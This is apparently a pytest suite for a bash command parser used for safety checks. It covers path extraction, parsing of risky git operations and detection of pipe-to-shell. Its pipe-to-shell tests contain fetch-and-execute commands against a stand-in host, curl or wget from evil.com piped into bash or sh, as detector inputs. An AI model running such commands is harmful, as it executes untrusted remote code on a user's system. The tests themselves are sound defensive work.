"""Tests for bash command parser."""

import pytest
from parsers.bash_parser import (
    parse_bash_command,
    extract_paths_from_command,
    get_git_subcommand_and_flags,
    is_pipe_to_shell,
)


class TestParseBashCommand:
    """Tests for parse_bash_command function."""

    def test_simple_command(self):
        """Test parsing simple command."""
        result = parse_bash_command("ls -la")
        assert len(result) == 1
        assert result[0].command == "ls"
        assert "-la" in result[0].flags or "-l" in result[0].flags

    def test_command_with_args(self):
        """Test parsing command with arguments."""
        result = parse_bash_command("cat file.txt")
        assert len(result) == 1
        assert result[0].command == "cat"
        assert "file.txt" in result[0].args

    def test_piped_commands(self):
        """Test parsing piped commands."""
        result = parse_bash_command("cat file.txt | grep pattern")
        assert len(result) >= 1
        # First command should have pipes_to set
        if result[0].pipes_to:
            assert result[0].command == "cat"
            assert result[0].pipes_to.command == "grep"

    def test_command_list_and(self):
        """Test parsing command list with &&."""
        result = parse_bash_command("cd dir && ls")
        assert len(result) >= 2

    def test_variable_as_command(self):
        """Test detecting variable as command."""
        result = parse_bash_command("$cmd file")
        assert len(result) == 1
        assert result[0].variable_as_command is True

    def test_empty_command(self):
        """Test parsing empty command."""
        result = parse_bash_command("")
        assert len(result) == 0

        result = parse_bash_command("   ")
        assert len(result) == 0


class TestExtractPaths:
    """Tests for extract_paths_from_command function."""

    def test_extract_file_path(self):
        """Test extracting file path from command."""
        result = parse_bash_command("cat /etc/passwd")
        paths = extract_paths_from_command(result[0])
        assert "/etc/passwd" in paths

    def test_extract_relative_path(self):
        """Test extracting relative path."""
        result = parse_bash_command("cat ./file.txt")
        paths = extract_paths_from_command(result[0])
        assert "./file.txt" in paths

    def test_extract_multiple_paths(self):
        """Test extracting multiple paths."""
        result = parse_bash_command("cp /src/file /dst/file")
        paths = extract_paths_from_command(result[0])
        assert "/src/file" in paths
        assert "/dst/file" in paths


class TestGitParsing:
    """Tests for git command parsing."""

    def test_git_push_force(self):
        """Test parsing git push --force."""
        result = parse_bash_command("git push --force origin main")
        subcommand, flags = get_git_subcommand_and_flags(result)
        assert subcommand == "push"
        assert "--force" in flags

    def test_git_push_force_with_lease(self):
        """Test parsing git push --force-with-lease."""
        result = parse_bash_command("git push --force-with-lease")
        subcommand, flags = get_git_subcommand_and_flags(result)
        assert subcommand == "push"
        assert "--force-with-lease" in flags

    def test_git_reset_hard(self):
        """Test parsing git reset --hard."""
        result = parse_bash_command("git reset --hard HEAD~1")
        subcommand, flags = get_git_subcommand_and_flags(result)
        assert subcommand == "reset"
        assert "--hard" in flags

    def test_git_branch_delete(self):
        """Test parsing git branch -D."""
        result = parse_bash_command("git branch -D feature-branch")
        subcommand, flags = get_git_subcommand_and_flags(result)
        assert subcommand == "branch"
        assert "-D" in flags


class TestPipeToShell:
    """Tests for pipe to shell detection."""

    def test_curl_pipe_bash(self):
        """Test detecting curl | bash."""
        result = parse_bash_command("curl http://evil.com/script.sh | bash")
        shell_targets = ["sh", "bash", "zsh"]
        assert is_pipe_to_shell(result, shell_targets) is True

    def test_wget_pipe_sh(self):
        """Test detecting wget | sh."""
        result = parse_bash_command("wget -O- http://evil.com/script.sh | sh")
        shell_targets = ["sh", "bash", "zsh"]
        assert is_pipe_to_shell(result, shell_targets) is True

    def test_safe_pipe(self):
        """Test safe pipe not detected."""
        result = parse_bash_command("cat file.txt | grep pattern")
        shell_targets = ["sh", "bash", "zsh"]
        assert is_pipe_to_shell(result, shell_targets) is False
